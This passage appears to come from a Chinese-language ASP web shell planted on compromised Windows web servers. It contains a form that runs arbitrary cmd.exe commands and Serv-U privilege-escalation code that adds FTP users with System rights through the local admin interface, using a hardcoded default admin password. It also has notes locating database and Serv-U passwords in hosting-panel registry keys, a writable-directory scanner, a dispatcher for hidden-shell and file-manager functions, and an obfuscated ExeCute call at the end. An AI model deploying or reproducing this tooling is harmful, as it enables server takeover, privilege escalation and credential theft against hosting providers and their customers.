        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=" & privilege  & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=" & fpath &"|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf		
		'--------
		'On Error Resume Next
		Set xPost = CreateObject("Microsoft.XMLHTTP")
		xPost.Open "POST", "http://127.0.0.1:"& port &"/secdst",True, "", ""
		xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit
		Set xPost =nothing
		response.write "<div align="&chr(34 )&"center"&chr(34 )&">FTP user "&fuser&"  pass "&fpass&" at port "& fport &"</div>"
	elseif request.Form("radiobutton") = "del" Then
	
		loginuser = "User " & user & vbCrLf
		loginpass = "Pass " & pass & vbCrLf
		mt = "SITE MAINTENANCE" & vbCrLf
		deluser =  "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & port & vbcrlf & " User="& fuser & vbcrlf
		quit = "QUIT" & vbCrLf	
		Set xPost3 = CreateObject("MSXML2.XMLHTTP")
		xPost3.Open "POST", "http://127.0.0.1:"& port &"/secdst", True
		xPost3.Send loginuser & loginpass & mt & deluser & quit 
		Set xPOST3=nothing
		response.write "<div align="&chr(34 )&"center"&chr(34 )&">FTP user "&fuser&"  pass "&fpass&" at port "& fport &" have deleted</div>"
	else
		response.write "<div align="&chr(34 )&"center"&chr(34 )&">let's Start!!!</div>"
	end if
end function
Function fuzhutq1()
RRS"<p><center>:星外虚拟主机辅助提权:</p><center>"
RRS"360杀毒db文件替换:<br>"
RRS"c:\Program Files\360\360SD\deepscan\Section\mutex.db <br> "
RRS"c:\Program Files\360\360Safe\deepscan\Section\mutex.db <br>"
RRS"C:\Program Files\360\360Safe\AntiSection\mutex.db <br>"
RRS"Flash文件替换:<br>"
RRS"C:\WINDOWS\system32\Macromed\Flash\Flash10q.ocx <br>"
RRS"IISrewrite3 文件替换：<br>"
RRS"C:\Program Files\Helicon\ISAPI_Rewrite3\Rewrite.log<br>"
RRS"C:\Program Files\Helicon\ISAPI_Rewrite3\httpd.conf<br>"
RRS"C:\Program Files\Helicon\ISAPI_Rewrite3\error.log <br>"
RRS"DU Meter流量统计信息日志文件替换：<br> "
RRS"c:\Documents and Settings\All Users\Application Data\Hagel Technologies\DU Meter\log.csv <br>"
RRS"诺顿杀毒文件替换:<br>"
RRS"c:\Program Files\Common Files\Symantec Shared\Persist.bak <br>"
RRS"c:\Program Files\Common Files\Symantec Shared\Validate.dat  <br>"
RRS"c:\Program Files\Common Files\Symantec Shared\Persist.Dat  <br>"
RRS"华盾文件替换:<br>"
RRS"C:\WINDOWS\hchiblis.ibl <br>"
RRS"一流过滤相关目录及文件： <br>"
RRS"C:\7i24.com\iissafe\log\startandiischeck.txt  <br>"
RRS"C:\7i24.com\iissafe\log\scanlog.htm   <br>"
RRS"其他相关:<br>"
RRS"Zend: C:\Program Files\Zend\ZendOptimizer-3.3.0\lib\Optimizer-3.3.0\php-5.2.x\ZendOptimizer.dll  <br>"
RRS"C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index\  <br>"
RRS"Ps:星外提权方法通用于各虚拟主机系统<br>"
end function
Function fuzhutq2()
RRS"<p><center>:华众虚拟主机辅助提权:</p><center>"
RRS"1`c:\windows\temp下有hzhost主机留下的ftp登陆记录v有用户名和密码<br>"
RRS"2@找mssql sa密码,mysql root密码及serv-u的administrator密码<br>"
RRS"mysql root密码：HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass <br>"
RRS"sqlserver sa密码：HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mastersvrpass<br>"
RRS"Serv-u管理密码：HKEY_LOCAL_MACHINE\software\hzhost\config\settings\svrpass<br>"
RRS"以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用<br>"
RRS"下载地址：百度搜索 'hzhosts华众虚拟主机系统6.x 破解数据库密码工具' <br>"
RRS"Ps:星外提权方法通用于此虚拟主机系统<br>"
end function
Function fuzhutq3()
RRS"<p><center>:N点虚拟主机辅助提权:</p><center>"
RRS"默认数据库下载：<br>"
RRS"1.9版：host_date/%23host%20%23%20date%23.mdb<br>"
RRS"1.96版：host_date/%23host%20%23%20date%23196.mdb <br>"
RRS"具体方法：通过星外相同方法读IIS,然后跨站到N点管理站点目录下，接着通过上述地址下载回得到的sa和mysql及站点的其他信息的key，通过下面的代码解密：<br>"
'RRS"地址:需更改处"
RRS"Ps:星外提权方法通用于此虚拟主机系统<br>"
end function
Function fuzhutq4()
RRS"<font color=#00FF00>请等待程序更新2ED</font>"
end function
Function fuzhutq5()
if Request("Paths") ="" then
Paths_str="c:\windows\"&chr(13)&chr(10)&"c:\Documents and Settings\"&chr(13)&chr(10)&"c:\Program Files\"
if Session("paths")<>"" then  Paths_str=Session("paths")
	Response.Write "<form id='form1' name='form1' method='post' action=''>"
	Response.Write "此程序可以检测你服务器的目录读写情况,为你服务器提供一些安全相关信息!<br>输入你想检测的目录,程序会自动检测子目录<br>"	
	Response.Write "<textarea name='Paths' cols='80' rows='10' class='Edit'>"&Paths_str&"</textarea>"
	Response.Write "<br />"
	Response.Write "<input type='submit' name='button' value='开始检测' / class='but1'>"
	Response.Write "<label for='CheckNextDir'>"
	Response.Write "<input name='CheckNextDir' type='checkbox' id='CheckNextDir' checked='checked' />测试目录  "
	Response.Write "</label>"
	Response.Write "<label for='CheckFile'>"
	Response.Write "<input name='CheckFile' type='checkbox' id='CheckFile' checked='checked'  />测试文件"
	Response.Write "</label>"
	Response.Write "<label for='ShowNoWrite'>"
	Response.Write "<input name='ShowNoWrite' type='checkbox' id='ShowNoWrite'/>"
	Response.Write "显禁写目录和文件</label>"
	Response.Write "<label for='NoCheckTemp'>"
	Response.Write "<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' checked='checked' />"
	Response.Write "不检测临时目录</label>"	
	Response.Write "</form>"
else
Response.Write  "<a href=""?"">重新输入路径</a><br>"
CheckFile = (Request("CheckFile")="on")
CheckNextDir = (Request("CheckNextDir")="on")
ShowNoWriteDir = (Request("ShowNoWrite")="on")
NoCheckTemp = (Request("NoCheckTemp")="on")
Response.Write "检测可能需要一定的时间请稍等......<br>"
response.Flush

Session("paths") = Request("Paths")

PathsSplit=Split(Request("Paths"),chr(13)&chr(10)) 
For i=LBound(PathsSplit) To UBound(PathsSplit) 
if instr(PathsSplit(i),":")>0 then
	ShowDirWrite_Dir_File Trim(PathsSplit(i)),CheckFile,CheckNextDir
End If 
Next
Response.Write "[扫描完成]<br>"
end if
end function
Function cmd2()
response.write"<form method='post'>"
response.write"<input type=text name='cmd' size=60>"
response.write"<input type=submit value='run'></form> "
response.write"<textarea readonly cols=80 rows=20> "
response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request.form("cmd")).stdout.readall
response.write"</textarea>"
end function
Function suftp()
RRS"<p><center>集成版本信息:</p>"
RRS"<form name='form1' method='post' action=''>"
RRS"<center>管理员:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
RRS"<center>管理员密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
RRS"<center>SERV-U端口:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
RRS"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='1'><br>"
RRS"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='1'><br>"
RRS"<center>帐号的所对的路径:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>"
RRS"<center>服务端口:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>"
RRS"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加"
RRS"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除"
RRS"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
Usr = request.Form("duser")
pwd = request.Form("dpwd")
port = request.Form("dport")
tuser = request.Form("tuser")
tpass = request.Form("tpass")
tpath = request.Form("tpath")
tport = request.Form("tport")
'Command = request.Form("dcmd")
if request.Form("radiobutton") = "add" Then
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
'leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=cctv|0.0.0.0|43859|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
'leaves = leaves & "quit" & vbcrlf
'--------
On Error Resume Next
Set xPost = CreateObject("MSXML2.XMLHTTP")
xPost.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost.Send(leaves)
Set xPOST=nothing
RRS ("命令成功执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
leaves = "User " & Usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
Set xPost3 = CreateObject("MSXML2.XMLHTTP")
xPost3.Open "POST", "http://127.0.0.1:"& port &"/leaves", True
xPost3.Send(leaves)
Set xPOST3=nothing
RRS "<font color=#ffffff>OKOKOK</font><br><BR>"
end if
End Function
Case "ScanDriveForm" 
 ScanDriveForm
 Case "ScanDrive"     
  ScanDrive Request("Drive")
  Case "ScFolder"      
   ScFolder Request("Folder")
case "apjdel":apjdel():case "Servu7x":su7():case "fuzhutq1":fuzhutq1():case "fuzhutq2":fuzhutq2():case "fuzhutq3":fuzhutq3():case "fuzhutq4":fuzhutq4():case "fuzhutq5":fuzhutq5():case "Cmd2":cmd2():case "suftp":suftp():case"hiddenshell":hiddenshell():case "php":php():case "aspx":aspx():case "jsp":jsp():Case "MMD":MMD():Case "adminab":adminab():Case "sql":sql():Case "downloads":downloads():Case "ReadREG":call ReadREG():Case "att":call att():Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "UpFile":UpFile():Case "Cmd1Shell":Cmd1Shell():Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL:Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "DbManager":DbManager():Case "Course":Course():Case "ServerInfo":ServerInfo():Case Else MainForm():End Select:ExeCute SinfoEn("r(ErowShn he tu~rvSe>~n<ioct Aif)`l>tm/h><dybo</S~RR~",Pos)




response.write ""+vbCrLf+""+vbCrLf+""
%>